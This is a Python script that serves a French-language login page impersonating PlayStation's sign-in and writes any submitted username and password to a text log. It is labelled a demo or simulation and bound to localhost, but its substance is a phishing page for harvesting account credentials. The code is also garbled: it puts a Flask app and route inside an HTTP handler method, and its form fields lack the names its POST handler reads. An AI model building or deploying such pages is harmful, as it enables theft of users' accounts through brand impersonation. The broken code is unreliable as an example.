from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
from flask import Flask, render_template_string
from functools import wraps
HOST = "127.0.0.1"
PORT = 8080
class DemoHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        app = Flask(__name__)
        html_page = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>PlayStation - Connexion</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #003791, #0055cc);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .login-box {
            background: white;
            padding: 40px;
            border-radius: 10px;
            width: 350px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            text-align: center;
        }

        .login-box h2 {
            margin-bottom: 30px;
            color: #003791;
        }

        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ccc;
            font-size: 14px;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #003791;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover {
            background-color: #002b6f;
        }

        .footer {
            margin-top: 15px;
            font-size: 12px;
            color: gray;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Connexion PlayStation</h2>
        <form>
            <input type="text" placeholder="ID de connexion (e-mail)" required>
            <input type="password" placeholder="Mot de passe" required>
            <button type="submit">Se connecter</button>
        </form>
        <div class="footer">
            Mot de passe oublié ?
        </div>
    </div>
</body>
</html>
"""

        @app.route("/")
        def home():
            return render_template_string(html_page)

        if __name__ == "__main__":
            app.run(debug=True)
            self.wfile.write(html_page.encode())

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode()
        parsed = parse_qs(post_data)
        username = parsed.get("username", [""])[0]
        password = parsed.get("password", [""])[0]
        with open("demo_log.txt", "a") as f:
            f.write(f"{username} | {password}\n")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Data saved (simulation).")
if __name__ == "__main__":
    server = HTTPServer((HOST, PORT), DemoHandler)
    print(f"Serveur demo sur http://{HOST}:{PORT}")
    server.serve_forever()